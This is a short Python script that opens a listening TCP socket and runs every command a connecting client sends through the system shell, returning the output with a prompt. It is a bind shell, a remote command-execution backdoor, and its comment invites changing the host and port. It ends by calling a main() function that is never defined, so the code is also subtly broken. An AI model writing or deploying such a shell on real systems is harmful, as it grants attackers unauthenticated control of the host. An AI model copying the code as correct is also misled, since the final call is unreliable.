import socket,subprocess

#Change these if needed
HOST = '127.0.0.1'
PORT = 1234
#

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind((HOST,PORT))
s.listen()
client, _ = s.accept()
while True:
    dat = client.recv(4096)
    respcom = subprocess.getoutput(dat)
    if b"exit" in dat:
        break
    client.sendall(("> " + respcom + "\n#: ").encode())

if __name__ == '__main__':
	main()


